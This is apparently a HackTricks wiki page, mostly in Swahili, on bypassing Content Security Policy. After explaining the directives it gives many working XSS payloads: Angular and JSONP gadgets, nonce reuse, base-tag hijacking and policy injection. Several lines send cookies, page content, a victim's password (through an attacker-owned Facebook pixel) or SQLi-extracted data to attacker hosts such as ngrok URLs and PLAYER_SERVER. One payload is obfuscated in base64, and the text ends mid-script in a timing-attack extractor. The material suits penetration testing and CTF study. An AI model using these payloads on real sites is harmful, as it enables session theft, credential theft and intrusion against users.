# Content Security Policy (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## CSP ni nini

Content Security Policy (CSP) inatambuliwa kama teknolojia ya kivinjari, iliyolenga kwa msingi wa **kuzuia mashambulizi kama cross-site scripting (XSS)**. Inafanya kazi kwa kufafanua na kueleza njia na vyanzo ambavyo rasilimali zinaweza kupakiwa kwa usalama na kivinjari. Rasilimali hizi zinajumuisha aina mbalimbali za vipengele kama picha, frames, na JavaScript. Kwa mfano, sera inaweza kuruhusu kupakia na kutekeleza rasilimali kutoka kwa domaini ileile (self), ikiwa ni pamoja na rasilimali za inline na utekelezaji wa msimbo wa string kupitia functions kama `eval`, `setTimeout`, au `setInterval`.

Utekelezaji wa CSP unafanywa kupitia **response headers** au kwa kuingiza **meta elements into the HTML page**. Kufuatia sera hii, vivinjari hutekeleza masharti haya kwa hiari na huzuia papo hapo uvunjaji wowote unaogundulika.

- Imewekwa kupitia response header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Imefanywa kwa kutumia meta tag:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Vichwa

CSP inaweza kutekelezwa au kufuatiliwa kwa kutumia vichwa vifuatavyo:

- `Content-Security-Policy`: Inatekeleza CSP; kivinjari kinazuia ukiukaji wowote.
- `Content-Security-Policy-Report-Only`: Imetumika kwa ufuatiliaji; inaripoti ukiukaji bila kuzuia. Inafaa kwa majaribio katika mazingira ya kabla ya uzalishaji.

### Kufafanua Rasilimali

CSP inazuia asili za kupakia maudhui zote za active na passive, ikidhibiti vipengele kama utekelezaji wa inline JavaScript na matumizi ya `eval()`. Mfano wa sera ni:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Directives

- **script-src**: Inaruhusu vyanzo maalum vya JavaScript, ikiwa ni pamoja na URLs, scripts za inline, na scripts zinazochochewa na event handlers au XSLT stylesheets.
- **default-src**: Inaweka sera ya msingi ya kupata rasilimali wakati maelekezo maalum ya fetch hayapo.
- **child-src**: Inaeleza vyanzo vinavyoruhusiwa kwa web workers na maudhui yaliyowekwa ndani ya frames.
- **connect-src**: Inazuia URLs zinazoweza kupakuliwa kupitia interfaces kama fetch, WebSocket, XMLHttpRequest.
- **frame-src**: Inaweka vikwazo kwa URLs zinazotumiwa na frames.
- **frame-ancestors**: Inaeleza vyanzo vinavyoweza kuingiza ukurasa wa sasa, inafaa kwa elementi kama `<frame>`, `<iframe>`, `<object>`, `<embed>`, na `<applet>`.
- **img-src**: Inaelekeza vyanzo vinavyoruhusiwa kwa picha.
- **font-src**: Inaeleza vyanzo vyenye uhalali kwa fonts zinazopakuliwa kutumia `@font-face`.
- **manifest-src**: Inaelekeza vyanzo vinavyoruhusiwa vya application manifest files.
- **media-src**: Inaelekeza vyanzo vinavyoruhusiwa kwa kupakia vitu vya media.
- **object-src**: Inaelekeza vyanzo vinavyoruhusiwa kwa elementi `<object>`, `<embed>`, na `<applet>`.
- **base-uri**: Inaeleza URLs zinazoruhusiwa kupakiwa kwa kutumia elementi `<base>`.
- **form-action**: Inaorodhesha endpoints halali kwa uwasilishaji wa fomu.
- **plugin-types**: Inazuia mime types ambazo ukurasa unaweza kuitisha.
- **upgrade-insecure-requests**: Inaelekeza browsers kuandika upya URLs za HTTP kuwa HTTPS.
- **sandbox**: Inatekeleza vikwazo vinavyofanana na attribute ya sandbox ya `<iframe>`.
- **report-to**: Inaeleza kundi ambalo ripoti itatumwa ikiwa sera itavunjwa.
- **worker-src**: Inaeleza vyanzo halali kwa scripts za Worker, SharedWorker, au ServiceWorker.
- **prefetch-src**: Inaeleza vyanzo halali kwa rasilimali ambazo zitawekwa au kuprefetcha.
- **navigate-to**: Inazuia URLs ambazo dokumenti inaweza kusogea kwa njia yoyote (a, form, window.location, window.open, n.k.)

### Sources

- `*`: Inaruhusu URLs zote isipokuwa zile zenye schemes `data:`, `blob:`, `filesystem:`.
- `'self'`: Inaruhusu kupakia kutoka domain ile ile.
- `'data'`: Inaruhusu rasilimali kupakiwa kupitia data scheme (mfano, picha zilizoencoded kwa Base64).
- `'none'`: Inazuia upakiaji kutoka chanzo chochote.
- `'unsafe-eval'`: Inaruhusu matumizi ya `eval()` na mbinu zinazofanana, haitokiwi kwa sababu za usalama.
- `'unsafe-hashes'`: Inawezesha event handlers maalum za inline.
- `'unsafe-inline'`: Inaruhusu matumizi ya rasilimali za inline kama `<script>` au `<style>` za inline, haitakiwa kwa sababu za usalama.
- `'nonce'`: Whitelist kwa scripts maalum za inline zinazotumia nonce ya kriptografia (nambari inayotumika mara moja).
- If you have JS limited execution it's possible to get a used nonce inside the page with `doc.defaultView.top.document.querySelector("[nonce]")` and then reuse it to load a malicious script (if strict-dynamic is used, any allowed source can load new sources so this isn't needed), like in:

<details>

<summary>Pakia script ukitumia nonce tena</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Inaweka scripts kwenye orodha nyeupe ambazo zina hash maalum ya sha256.
- `'strict-dynamic'`: Inaruhusu kupakia scripts kutoka chanzo chochote ikiwa zimewekwa kwenye orodha nyeupe kwa nonce au hash.
- `'host'`: Inaelekeza host maalum, kama `example.com`.
- `https:`: Inapunguza URLs kwa zile zinazotumia HTTPS.
- `blob:`: Inaruhusu rasilimali kupakiwa kutoka Blob URLs (kwa mfano, Blob URLs zilizotengenezwa kupitia JavaScript).
- `filesystem:`: Inaruhusu rasilimali kupakiwa kutoka filesystem.
- `'report-sample'`: Inajumuisha sampuli ya msimbo uliokiuka katika ripoti ya ukiukaji (inayosaidia debugging).
- `'strict-origin'`: Fanana na 'self' lakini inahakikisha ngazi ya usalama ya protocol ya vyanzo inalingana na nyaraka (tu origins salama zinaweza kupakia rasilimali kutoka origins salama).
- `'strict-origin-when-cross-origin'`: Inatuma URL kamili wakati wa kufanya maombi ya same-origin lakini inatuma tu origin wakati ombi ni cross-origin.
- `'unsafe-allow-redirects'`: Inaruhusu rasilimali kupakiwa ambazo zitatoa redirect mara moja kwa rasilimali nyingine. Haipendekezi kwani inapunguza usalama.

## Sheria za CSP Zisizo Salama

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Payload inayofanya kazi: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> Hii haifanyi kazi, kwa maelezo zaidi [**check this**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Payload inayofanya kazi:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Ikiwa kwa namna fulani unaweza kusababisha **allowed JS code created a new script tag** kwenye DOM kwa kutumia JS yako, kwa sababu script iliyoruhusiwa ndiyo inayoiunda, basi **new script tag will be allowed to be executed**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Payload inayofanya kazi:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Lack of object-src and default-src

> [!CAUTION] > **Inaonekana hii haifanyi kazi tena**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Payloads zinazofanya kazi:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Kupakia Faili + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Ikiwa unaweza kupakia faili ya JS, unaweza bypass CSP hii:

Payload inayofanya kazi:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
Hata hivyo, kuna uwezekano mkubwa kwamba server inafanya **uthibitishaji wa faili zilizopakiwa** na itakuwezesha tu **kupakia aina maalum ya faili**.

Zaidi ya hayo, hata kama unaweza kupakia **JS code inside** ndani ya faili ukitumia extension inayokubaliwa na server (k.m.: _script.png_) hilo haitoshi kwa sababu server zingine kama apache server **select MIME type of the file based on the extension** na browsers kama Chrome wata **reject to execute Javascript** code ndani ya kitu kinachotakiwa kuwa picha. "Hopefully", kuna makosa. Kwa mfano, kutoka CTF nilijifunza kwamba **Apache doesn't know** extension _**.wave**_, kwa hivyo haitoi nayo **MIME type like audio/***.

Kutoka hapa, ikiwa utapata XSS na upload ya faili, na utafanikiwa kupata **misinterpreted extension**, unaweza kujaribu kupakia faili lenye extension hiyo pamoja na content ya script. Au, ikiwa server inakagua muundo sahihi wa faili iliyopakuliwa, tengeneza polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

Ikiwa haiwezekani kuingiza JS, bado unaweza kujaribu exfiltrate kwa mfano credentials kwa **injecting a form action** (na labda kutegemea password managers kujaza nywila kiotomatiki). Unaweza kupata [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Pia, kumbuka kwamba `default-src` does not cover form actions.

### Third Party Endpoints + ('unsafe-eval')

> [!WARNING]
> Kwa baadhi ya payload zifuatazo, **`unsafe-eval` hata haihitajiki**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Pakia toleo lenye udhaifu la angular na endesha JS yoyote:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads zinazotumia Angular + library yenye functions zinazorejesha `window` object ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> Makala inaonyesha kwamba unaweza **load** zote **libraries** kutoka `cdn.cloudflare.com` (au repo nyingine yoyote ya JS libraries iliyoruhusiwa), kutekeleza functions zote zilizoongezwa kutoka kila library, na kuangalia **functions gani kutoka libraries gani zinarejesha `window` object**.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS kutoka kwa jina la darasa:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Kutumia vibaya google recaptcha JS code

Kulingana na [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) unaweza kutumia vibaya [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) ndani ya CSP ili kutekeleza JS code yoyote kupita kando ya CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Zaidi [**payloads kutoka kwenye writeup hii**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### Kutumia vibaya www.google.com kwa open redirect

URL ifuatayo inarudisha kwa example.com (kutoka [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Kutumia vibaya \*.google.com/script.google.com

Inawezekana kutumia vibaya Google Apps Script kupokea taarifa katika ukurasa ndani ya script.google.com. Kama ilivyofanywa katika [done in this report](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Endpoints za Wahusika wa Tatu + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Mazingira kama haya ambapo `script-src` imewekwa kwa `self` na domain maalum iliyoorodheshwa inaweza kupitilizwa kwa kutumia JSONP. JSONP endpoints zinaruhusu njia za callback zisizo salama ambazo zinamruhusu mshambuliaji kufanya XSS, working payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **ina endpoints za JSONP tayari kwa CSP bypass ya tovuti mbalimbali.**

Udhaifu huo huo utatokea ikiwa **trusted endpoint contains an Open Redirect** kwa sababu ikiwa initial endpoint ni trusted, redirects pia ni trusted.

### Matumizi Mabaya ya Wahusika wa Tatu

Kama ilivyoelezwa katika [following post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), kuna domaini nyingi za pihak tatu ambazo zinaweza kuruhusiwa sehemu fulani ya CSP na zinaweza kutumiwa vibaya ili exfiltrate data au execute JavaScript code. Baadhi ya pihak tatu hizi ni:

| Shirika           | Domaini Zilizoruhusiwa                        | Uwezo       |
| ----------------- | -------------------------------------------- | ----------- |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil       |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil       |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec        |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec |

Ikiwa utapata moja ya domaini zilizoruhusiwa katika CSP ya target yako, kuna uwezekano kwamba unaweza bypass CSP kwa kujisajili kwenye huduma ya pihak tatu na, ama exfiltrate data kwa huduma hiyo au execute code.

Kwa mfano, ikiwa utapata CSP ifuatayo:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
au
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Unapaswa kuweza exfiltrate data, kwa namna ile ile kama imekuwa ikifanywa na [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Katika kesi hii, fuata hatua hizi za jumla:

1. Unda akaunti ya Facebook Developer hapa.
2. Tengeneza app mpya ya "Facebook Login" na chagua "Website".
3. Nenda kwenye "Settings -> Basic" na upate "App ID" yako.
4. Kwenye tovuti lengwa unayotaka exfiltrate data kutoka, unaweza exfiltrate data kwa kutumia moja kwa moja Facebook SDK gadget "fbq" kupitia "customEvent" na data payload.
5. Nenda kwenye App yako "Event Manager" na chagua application uliyotengeneza (note the event manager could be found in an URL similar to this: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events
6. Chagua tab "Test Events" kuona events zinazotumwa na "your" web site.

Kisha, kwa upande wa victim, utekeleze code ifuatayo ili kuanzisha Facebook tracking pixel kuelekeza kwenye attacker's Facebook developer account app-id na kutoa custom event kama ifuatavyo:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Kuhusu domain nyingine saba za third-party zilizotajwa kwenye jedwali hapo awali, kuna njia nyingi zaidi za kuzitumia vibaya. Rejea alipokuwa [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) kwa maelezo ya ziada kuhusu matumizi mabaya mengine ya third-party.

### Kupitia RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Mbali na ule uelekezaji uliotajwa hapo juu wa kupitisha vikwazo vya path, kuna mbinu nyingine inayoitwa Relative Path Overwrite (RPO) inayoweza kutumika kwenye servers fulani.

Kwa mfano, ikiwa CSP inaruhusu path `https://example.com/scripts/react/`, inaweza kupitishwa kama ifuatavyo:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Kivinjari hatimaye kitapakia `https://example.com/scripts/angular/angular.js`.

Hii inafanya kazi kwa sababu kwa upande wa kivinjari, unapakia faili iliyoitwa `..%2fangular%2fangular.js` iliyoko chini ya `https://example.com/scripts/react/`, ambayo inakubaliana na CSP.

∑, zitatafsiri, na kwa ufanisi zitafanya ombi la `https://example.com/scripts/react/../angular/angular.js`, ambalo ni sawa na `https://example.com/scripts/angular/angular.js`.

Kwa **kuita faida ukosefu huu wa muafaka katika tafsiri ya URL kati ya kivinjari na server, kanuni za path zinaweza kuepukwa**.

Suluhisho ni kutotumia `%2f` kama `/` upande wa server, kuhakikisha tafsiri sawa kati ya kivinjari na server ili kuepuka tatizo hili.

Online Example:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Utekelezaji wa JS katika Iframes


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### **base-uri** inakosekana

Ikiwa diretivu ya **base-uri** inakosekana unaweza kuitumia vibaya kufanya [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html).

Zaidi ya hayo, ikiwa **ukurasa unapakia script kwa kutumia relative path** (like `<script src="/js/app.js">`) ukitumia **Nonce**, unaweza kutumia vibaya **base** **tag** ili kuifanya **load** script kutoka **server yako mwenyewe ukifanikisha XSS.**\
Kama ukurasa unaoathirika unapakiwa kwa **httpS**, tumia URL ya **httpS** katika base.
```html
<base href="https://www.attacker.com/" />
```
### Matukio ya AngularJS

Sera maalum inayojulikana kama Content Security Policy (CSP) inaweza kuweka vizingiti kwa matukio ya JavaScript. Hata hivyo, AngularJS inatoa matukio maalum kama mbadala. Ndani ya tukio, AngularJS hutoa object ya kipekee `$event`, inayorejea kwenye native browser event object. Object `$event` inaweza kutumiwa kuzunguka CSP. Kwa mfano, katika Chrome, object `$event/event` ina sifa `path`, inayoshikilia array ya object zilizohusika katika mnyororo wa utekelezaji wa tukio, na object `window` mara zote ikipangwa mwisho. Muundo huu ni muhimu kwa mbinu za kutoroka sandbox.

Kwa kupeleka array hii kwenye filter ya `orderBy`, inawezekana kuzunguka juu yake, ukaitegemea element ya mwisho (object `window`) kutekeleza global function kama `alert()`. Snippet ya code iliyooneshwa hapa chini inaelezea mchakato huu:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Kiibukizo hiki kinaonyesha matumizi ya directive ya `ng-focus` kusababisha tukio, kutumia `$event.path|orderBy` kuendesha array ya `path`, na kutumia object ya `window` kutekeleza `alert()` na hivyo kufichua `document.cookie`.

**Tafuta Angular bypasses nyingine kwenye** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS na whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Sera ya CSP ambayo inaweka whitelist ya domains kwa ajili ya script loading katika application ya Angular JS inaweza kupitishwa kwa uitoaji wa callback functions na baadhi ya vulnerable classes. Taarifa zaidi kuhusu mbinu hii zinaweza kupatikana katika mwongozo wa kina uliopo kwenye [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22).

Payloads zinazofanya kazi:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Endpoints nyingine za JSONP za arbitrary execution zinaweza kupatikana [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (baadhi yao zilifutwa au kurekebishwa)

### Kupita kupitia Uelekezaji

Nini kinatokea wakati CSP inakutana na uelekezaji upande wa seva? Ikiwa uelekezaji unasababisha origin tofauti ambayo haijaruhusiwa, bado itashindwa.

Hata hivyo, kwa mujibu wa maelezo katika [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), ikiwa uelekezaji unasababisha njia tofauti, unaweza kupitisha vikwazo vya asili.

Hapa kuna mfano:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
If CSP is set to `https://www.google.com/a/b/c/d`, since the path is considered, both `/test` and `/a/test` scripts will be blocked by CSP.

However, the final `http://localhost:5555/301` will be **redirected on the server-side to `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Since it is a redirection, the **path is not considered**, and the **script can be loaded**, thus bypassing the path restriction.

With this redirection, even if the path is specified completely, it will still be bypassed.

Therefore, the best solution is to ensure that the website does not have any open redirect vulnerabilities and that there are no domains that can be exploited in the CSP rules.

### Bypass CSP with dangling markup

Soma [hapa](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` inamaanisha kwamba unaweza kutekeleza script yoyote ndani ya code (XSS inaweza kutekeleza code) na `img-src *` inamaanisha kwamba unaweza kutumia kwenye webpage picha yoyote kutoka kwa rasilimali yoyote.

Unaweza bypass CSP hii kwa exfiltrating data kupitia picha (katika tukio hili XSS inatumia CSRF ambapo ukurasa unaopatikana na bot una SQLi, na extract flag kupitia picha):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
Chanzo: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Unaweza pia kutumia vibaya usanidi huu ili **kupakia javascript code iliyowekwa ndani ya picha**. Kwa mfano, ikiwa ukurasa unaruhusu kupakua picha kutoka Twitter. Unaweza **unda** **picha maalum**, **pakia** kwenye Twitter na kutumia "**unsafe-inline**" ku**tekeleza** JS code (kama XSS ya kawaida) ambayo itapakia **picha**, **itoa** **JS** kutoka ndani yake na **kuitekeleza** **hiyo**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Kwa Service Workers

Service workers **`importScripts`** function haizuiwi na CSP:


{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Utafiti:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Ikiwa **parameter** uliyotuma inakwekwa ndani ya **declaration** ya **policy,** basi unaweza **badilisha** **policy** kwa namna yoyote itakayoi**fanya isiwe na maana**. Unaweza **kuruhusu script 'unsafe-inline'** kwa mojawapo ya njia hizi za bypass:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Kwa sababu directive hii itafunika **script-src directives zilizopo**.\
You can find an example here: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Kwenye Edge ni rahisi zaidi. Kama unaweza kuongeza katika CSP tu hii: **`;_`**, Edge itaondoa kabisa **policy**.\
Example: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Time attack

Tambua kutokuwepo kwa directive `'unsafe-inline'`\
Mara hii unaweza kumfanya mwathirika **kupakia** ukurasa ulioko chini ya **udhibiti wako** kupitia **XSS** kwa kutumia `<iframe`. Mara hii utamfanya mwathirika afikie ukurasa kutoka ambako unataka kutoa taarifa (**CSRF**). Huwezi kupata yaliyomo ya ukurasa, lakini kama kwa namna fulani unaweza **kudhibiti muda ukurasa unavyohitaji kupakia** unaweza kutoa taarifa unazohitaji.

Mara hii **flag** itatolewa; kila wakati **char inapokisiwa kwa usahihi** kupitia SQLi, **response** inachukua **muda zaidi** kutokana na sleep function. Kisha, utaweza kutoa flag:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

